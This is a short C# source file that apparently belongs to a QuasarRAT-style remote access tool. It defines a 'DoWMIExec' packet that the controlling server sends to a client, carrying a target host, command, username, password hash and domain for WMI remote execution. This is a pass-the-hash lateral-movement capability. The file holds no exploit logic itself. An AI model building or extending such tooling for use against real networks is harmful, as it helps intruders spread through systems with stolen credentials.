using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoWMIExec : IPacket

    {
        public string target { get; set; }
        public string command { get; set; }
        public string username { get; set; }
        public string hash { get; set; }
        public string domain { get; set; }
        public int sleep { get; set; }

        public DoWMIExec()
        {

        }
        public DoWMIExec(string command, string username, string hash, string target, string domain, int sleep)
        {
            this.command = command;
            this.username = username;
            this.hash = hash;
            this.target = target;
            this.domain = domain;
            this.sleep = sleep;

        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
